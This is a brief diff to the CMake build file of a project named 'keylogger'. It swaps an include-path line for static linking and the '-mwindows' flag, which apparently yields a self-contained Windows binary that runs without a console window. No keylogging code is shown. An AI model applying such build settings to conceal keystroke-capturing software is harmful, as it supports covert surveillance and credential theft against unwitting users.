@@ -3,7 +3,7 @@ project(keylogger)
 
 set(CMAKE_CXX_STANDARD 17)
 # include the subdirectory files
-include_directories(include)
+set(CMAKE_EXE_LINKER_FLAGS "-static -mwindows")
 
 add_executable(keylogger src/main.cpp
     include/Key.h
